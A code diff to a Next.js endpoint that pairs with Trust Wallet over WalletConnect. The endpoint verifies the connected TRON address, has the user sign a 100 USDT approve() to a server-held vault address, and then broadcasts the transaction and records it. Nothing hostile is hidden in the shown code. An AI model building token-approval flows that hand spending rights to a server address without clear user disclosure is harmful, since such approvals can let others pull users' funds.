@@ -3,18 +3,15 @@
  *
  * Server-Sent Events endpoint.  The server acts as the WalletConnect "dApp":
  *
- *   1. Builds the USDT approve() transaction via TronGrid.
- *   2. Creates a WC Sign v2 session proposal — generates a URI.
- *   3. Streams  { type:'uri', uri, deepLink }  so the client can show the
- *      "Open in Trust Wallet" button that deep-links to TW's native WC.
- *   4. Waits for Trust Wallet to connect (timeout 90 s).
- *   5. Sends tron_signTransaction to the connected session.
- *   6. Receives the signed transaction, broadcasts via TronGrid, polls confirmation.
+ *   1. Creates a WC Sign v2 session proposal — generates a URI.
+ *   2. Streams  { type:'uri', uri, deepLink }  so the client can show the
+ *      "Open in Trust Wallet" deep link.
+ *   3. Waits for Trust Wallet to connect (timeout 90 s).
+ *   4. Verifies the connected TRON address matches the stored wallet address.
+ *   5. Builds the USDT approve() tx FRESH using the confirmed session address
+ *      (avoids expiry + guarantees signing address == tx owner address).
+ *   6. Sends tron_signTransaction; normalises + broadcasts; retries on SIGERROR.
  *   7. Marks wallet.approved = true in MongoDB, streams  { type:'approved', txHash }.
- *
- * Because the server (not the DApp browser) holds the WC relay connection,
- * tron_signTransaction goes through Trust Wallet's NATIVE WC interface and
- * works correctly — bypassing the DApp-browser signing bug.
  *
  * Required env vars:
  *   NEXT_PUBLIC_WC_PROJECT_ID   — WalletConnect Cloud project ID
@@ -25,10 +22,13 @@
 import { NextResponse }              from 'next/server';
 import { requireAuth }               from '@/lib/auth/require-auth';
 import { connectToDatabase, Wallet } from '@/lib/db';
-import { buildApproveRawTx, broadcastSignedTx, pollTronTxGrid, TRON_WC_CHAIN } from '@/lib/tron/wc-tron';
+import {
+  buildApproveRawTx, broadcastSignedTx, pollTronTxGrid,
+  TRON_WC_CHAIN, tronToEvmHex,
+} from '@/lib/tron/wc-tron';
 
 export const dynamic = 'force-dynamic';
-export const maxDuration = 90; // Vercel Pro: up to 300 s; 90 s covers the full flow
+export const maxDuration = 90;
 
 const APPROVE_SUN = 100_000_000n; // 100 USDT
 
@@ -43,8 +43,31 @@ function makeMemStorage() {
   };
 }
 
+/** Extract TRON base58 address from WC session (strips chain prefix). */
+function sessionTronAddr(session: any): string {
+  const accounts: string[] = session?.namespaces?.tron?.accounts ?? [];
+  return accounts[0]?.split(':').at(-1) ?? '';
+}
+
+/** Normalise: convert base58 → 20-byte lowercase hex for comparison. */
+function addrKey(base58: string): string {
+  try { return tronToEvmHex(base58).toLowerCase(); } catch { return base58.toLowerCase(); }
+}
+
+/** Normalise sig: strip 0x, convert Ethereum-style v (27/28) → TRON (0/1). */
+function normSig(sig: unknown): string[] {
+  const arr = Array.isArray(sig) ? sig : [sig];
+  return arr.map(s => {
+    let hex = String(s ?? '').replace(/^0x/i, '');
+    if (hex.length === 130) {
+      const v = parseInt(hex.slice(-2), 16);
+      if (v === 27 || v === 28) hex = hex.slice(0, -2) + (v - 27).toString(16).padStart(2, '0');
+    }
+    return hex;
+  });
+}
+
 export async function GET(req: Request) {
-  // Auth check outside the stream so we can return a proper 401 JSON.
   let user: { id: string };
   try { user = await requireAuth(); }
   catch { return NextResponse.json({ error: 'Unauthorized' }, { status: 401 }); }
@@ -56,9 +79,7 @@ export async function GET(req: Request) {
   if (!vault) return NextResponse.json({ error: 'VAULT_TRC20 not configured' }, { status: 503 });
 
   const encoder = new TextEncoder();
-  function sseEvent(data: object) {
-    return encoder.encode(`data: ${JSON.stringify(data)}\n\n`);
-  }
+  const sseEvent = (data: object) => encoder.encode(`data: ${JSON.stringify(data)}\n\n`);
 
   const stream = new ReadableStream({
     async start(controller) {
@@ -71,13 +92,9 @@ export async function GET(req: Request) {
         if (!wallet) { send({ type: 'error', message: 'Wallet not found' }); controller.close(); return; }
         if (wallet.chainId !== 195) { send({ type: 'error', message: 'Only TRC20 wallets need this flow' }); controller.close(); return; }
 
-        send({ type: 'status', message: 'Building approval transaction…' });
-
-        /* ── 2. Build approve tx via TronGrid ── */
-        const rawTx = await buildApproveRawTx(wallet.address, vault, APPROVE_SUN) as Record<string, unknown>;
         send({ type: 'status', message: 'Connecting to Trust Wallet…' });
 
-        /* ── 3. Create server-side WC session ── */
+        /* ── 2. Create WC session (URI first — rawTx is built after connect) ── */
         const { SignClient } = await import('@walletconnect/sign-client');
         const client = await SignClient.init({
           projectId: process.env.NEXT_PUBLIC_WC_PROJECT_ID ?? '',
@@ -91,7 +108,7 @@ export async function GET(req: Request) {
         });
 
         const { uri, approval } = await client.connect({
-          requiredNamespaces: {
+          optionalNamespaces: {
             tron: {
               chains:  [TRON_WC_CHAIN],
               methods: ['tron_signTransaction'],
@@ -105,130 +122,124 @@ export async function GET(req: Request) {
         const deepLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
         send({ type: 'uri', uri, deepLink });
 
-        /* ── 4. Wait for wallet to connect (90 s) ── */
+        /* ── 3. Wait for wallet to connect ── */
         send({ type: 'status', message: 'Waiting for Trust Wallet to connect…' });
         let session: any;
         try {
-          const timeoutPromise = new Promise<never>((_, reject) =>
-            setTimeout(() => reject(new Error('Timed out waiting for wallet connection. Please try again.')), 85_000)
-          );
-          session = await Promise.race([approval(), timeoutPromise]);
+          session = await Promise.race([
+            approval(),
+            new Promise<never>((_, rej) => setTimeout(() => rej(new Error('Timed out waiting for wallet connection. Please try again.')), 85_000)),
+          ]);
         } catch (err: any) {
           send({ type: 'error', message: err.message ?? 'Connection timed out' });
           controller.close(); return;
         }
 
         const topic = session.topic as string;
-        send({ type: 'status', message: 'Wallet connected — requesting approval…' });
 
-        /* ── 5. Sign (try signAndSend first, fall back to sign-only) ── */
-        // Attempt 1: tron_signAndSendRawTransaction — wallet handles broadcast, sidesteps SIGERROR.
-        let txid: string | null = null;
-        try {
-          const r = await (client.request as any)({
-            topic, chainId: TRON_WC_CHAIN,
-            request: { method: 'tron_signAndSendRawTransaction', params: { transaction: rawTx } },
+        /* ── 4. Verify connected address matches registered wallet ── */
+        const sessionAddr = sessionTronAddr(session);
+        if (!sessionAddr) {
+          send({ type: 'error', message: 'No TRON address found in wallet session.' });
+          controller.close(); return;
+        }
+        if (addrKey(sessionAddr) !== addrKey(wallet.address)) {
+          send({
+            type: 'error',
+            message: `Wrong wallet connected. Please open Trust Wallet and switch to address ${wallet.address.slice(0, 8)}…${wallet.address.slice(-6)}, then try again.`,
           });
-          const extractId = (v: unknown): string => {
-            if (typeof v === 'string' && v.length >= 60) return v;
-            if (v && typeof v === 'object') {
-              const o = v as Record<string, any>;
-              for (const k of ['txID','txid','result','hash']) if (typeof o[k] === 'string' && o[k].length >= 60) return o[k];
-            }
-            return '';
-          };
-          txid = extractId(r) || null;
-          if (txid) console.log('[tron-approve] signAndSend txid:', txid.slice(0, 16));
-        } catch { /* method not supported — fall through */ }
+          try { await client.disconnect({ topic, reason: { code: 6000, message: 'wrong address' } }); } catch { /* ok */ }
+          controller.close(); return;
+        }
 
-        if (!txid) {
-          // Attempt 2: tron_signTransaction + manual broadcast.
-          send({ type: 'status', message: 'Waiting for Trust Wallet to sign…' });
-          let signResult: unknown;
-          try {
-            signResult = await (client.request as any)({
-              topic, chainId: TRON_WC_CHAIN,
-              request: { method: 'tron_signTransaction', params: { transaction: rawTx } },
-            });
-          } catch (err: any) {
-            const msg = String(err?.message ?? err);
-            if (/cancel|reject|denied|dismiss/i.test(msg)) {
-              send({ type: 'error', message: 'You cancelled the approval. Tap "Approve" to enable Add Funds.' });
-            } else {
-              send({ type: 'error', message: `Signing failed: ${msg.slice(0, 100)}` });
-            }
-            controller.close(); return;
+        send({ type: 'status', message: 'Wallet connected — building approval transaction…' });
+
+        /* ── 5. Build rawTx FRESH with the confirmed session address ── */
+        // Building after connect means: no expiry window, and owner_address === signing key.
+        let rawTx: Record<string, unknown>;
+        try {
+          rawTx = await buildApproveRawTx(sessionAddr, vault, APPROVE_SUN) as Record<string, unknown>;
+        } catch (err: any) {
+          send({ type: 'error', message: `Failed to build transaction: ${(err?.message ?? String(err)).slice(0, 100)}` });
+          controller.close(); return;
+        }
+
+        send({ type: 'status', message: 'Requesting approval in Trust Wallet…' });
+
+        /* ── 6. Sign ── */
+        let signResult: unknown;
+        try {
+          signResult = await (client.request as any)({
+            topic, chainId: TRON_WC_CHAIN,
+            request: { method: 'tron_signTransaction', params: { transaction: rawTx } },
+          });
+        } catch (err: any) {
+          const msg = String(err?.message ?? err);
+          if (/cancel|reject|denied|dismiss/i.test(msg)) {
+            send({ type: 'error', message: 'You cancelled the approval. Tap "Approve" to enable Add Funds.' });
+          } else {
+            send({ type: 'error', message: `Signing failed: ${msg.slice(0, 100)}` });
           }
+          controller.close(); return;
+        }
 
-          // Normalize signature: strip 0x, convert v=27/28 → 0/1 for TronGrid.
-          const normSig = (sig: unknown): string[] => {
-            const arr = Array.isArray(sig) ? sig : [sig];
-            return arr.map(s => {
-              let hex = String(s ?? '').replace(/^0x/i, '');
-              if (hex.length === 130) {
-                const v = parseInt(hex.slice(-2), 16);
-                if (v === 27 || v === 28) hex = hex.slice(0, -2) + (v - 27).toString(16).padStart(2, '0');
-              }
-              return hex;
-            });
-          };
+        /* ── 7. Assemble signed tx ── */
+        const isFullTx = signResult && typeof signResult === 'object'
+          && ('raw_data' in (signResult as object) || 'raw_data_hex' in (signResult as object));
 
-          const isFullTx = signResult && typeof signResult === 'object'
-            && ('raw_data' in (signResult as object) || 'raw_data_hex' in (signResult as object));
+        const signedTx: Record<string, unknown> = isFullTx
+          ? {
+              ...(signResult as Record<string, unknown>),
+              raw_data_hex: (signResult as any).raw_data_hex ?? rawTx.raw_data_hex,
+              signature: normSig((signResult as any).signature),
+            }
+          : {
+              txID:        rawTx.txID,
+              raw_data:    rawTx.raw_data,
+              raw_data_hex: rawTx.raw_data_hex,
+              signature:   normSig((signResult as any)?.signature ?? signResult),
+            };
 
-          const signedTx: Record<string, unknown> = isFullTx
-            ? {
-                ...(signResult as Record<string, unknown>),
-                // Always carry raw_data_hex — TW may omit it, causing TronGrid serialization mismatch
-                raw_data_hex: (signResult as any).raw_data_hex ?? rawTx.raw_data_hex,
-                signature: normSig((signResult as any).signature),
-              }
-            : { txID: rawTx.txID, raw_data: rawTx.raw_data, raw_data_hex: rawTx.raw_data_hex,
-                signature: normSig((signResult as any)?.signature ?? signResult) };
+        const sig0 = Array.isArray(signedTx.signature) ? String(signedTx.signature[0]) : '';
+        console.log('[tron-approve] isFullTx:', isFullTx, 'v byte:', sig0 ? parseInt(sig0.slice(-2), 16) : 'n/a', 'txID:', String(signedTx.txID).slice(0, 16));
 
-          const sig0 = Array.isArray(signedTx.signature) ? String(signedTx.signature[0]) : '';
-          console.log('[tron-approve] isFullTx:', isFullTx, 'sig v byte:', sig0 ? parseInt(sig0.slice(-2), 16) : 'n/a', 'txID:', String(signedTx.txID).slice(0, 16));
+        send({ type: 'status', message: 'Broadcasting to TRON network…' });
 
-          send({ type: 'status', message: 'Approval signed — broadcasting to TRON…' });
-
-          try {
-            ({ txid } = await broadcastSignedTx(signedTx));
-          } catch (broadcastErr: any) {
-            const errMsg = String(broadcastErr?.message ?? broadcastErr);
-            // SIGERROR: try flipping v byte between 0 and 1
-            if (errMsg.toUpperCase().includes('SIGERROR') && sig0) {
-              const v = parseInt(sig0.slice(-2), 16);
-              const altV = v === 0 ? 1 : v === 1 ? 0 : v === 27 ? 28 : v === 28 ? 27 : -1;
-              if (altV >= 0) {
-                console.log('[tron-approve] SIGERROR — retrying with v:', altV, '(was', v, ')');
-                const altSig = sig0.slice(0, -2) + altV.toString(16).padStart(2, '0');
-                try {
-                  ({ txid } = await broadcastSignedTx({ ...signedTx, signature: [altSig] }));
-                } catch (retryErr: any) {
-                  send({ type: 'error', message: `Broadcast failed: ${(retryErr?.message ?? String(retryErr)).slice(0, 120)}` });
-                  controller.close(); return;
-                }
-              } else {
-                send({ type: 'error', message: `Broadcast failed (SIGERROR, v=${v}): ${errMsg.slice(0, 100)}` });
+        /* ── 8. Broadcast (retry with flipped v on SIGERROR) ── */
+        let txid: string;
+        try {
+          ({ txid } = await broadcastSignedTx(signedTx));
+        } catch (broadcastErr: any) {
+          const errMsg = String(broadcastErr?.message ?? broadcastErr);
+          if (errMsg.toUpperCase().includes('SIGERROR') && sig0) {
+            const v    = parseInt(sig0.slice(-2), 16);
+            const altV = v === 0 ? 1 : v === 1 ? 0 : v === 27 ? 28 : v === 28 ? 27 : -1;
+            if (altV >= 0) {
+              console.log('[tron-approve] SIGERROR — retrying v:', v, '→', altV);
+              try {
+                ({ txid } = await broadcastSignedTx({
+                  ...signedTx,
+                  signature: [sig0.slice(0, -2) + altV.toString(16).padStart(2, '0')],
+                }));
+              } catch (retryErr: any) {
+                send({ type: 'error', message: `Broadcast failed: ${(retryErr?.message ?? String(retryErr)).slice(0, 120)}` });
                 controller.close(); return;
               }
             } else {
-              send({ type: 'error', message: `Broadcast failed: ${errMsg.slice(0, 100)}` });
+              send({ type: 'error', message: `Broadcast failed (SIGERROR v=${v}): contact support` });
               controller.close(); return;
             }
+          } else {
+            send({ type: 'error', message: `Broadcast failed: ${errMsg.slice(0, 120)}` });
+            controller.close(); return;
           }
         }
-
-        if (!txid) { send({ type: 'error', message: 'No transaction ID returned' }); controller.close(); return; }
-
-        send({ type: 'status', message: 'Approval signed — broadcasting to TRON…' });
 
         send({ type: 'status', message: 'Confirming on TRON network…' });
         await pollTronTxGrid(txid);
 
-        /* ── 7. Save approval to DB ── */
+        /* ── 9. Persist approval ── */
         await Wallet.findByIdAndUpdate(walletId, { approved: true, approvalTxHash: txid });
-
         send({ type: 'approved', txHash: txid });
 
         try { await client.disconnect({ topic, reason: { code: 6000, message: 'Done' } }); } catch { /* ok */ }
@@ -242,9 +253,9 @@ export async function GET(req: Request) {
 
   return new Response(stream, {
     headers: {
-      'Content-Type':  'text/event-stream',
-      'Cache-Control': 'no-cache',
-      'Connection':    'keep-alive',
+      'Content-Type':      'text/event-stream',
+      'Cache-Control':     'no-cache',
+      'Connection':        'keep-alive',
       'X-Accel-Buffering': 'no',
     },
   });
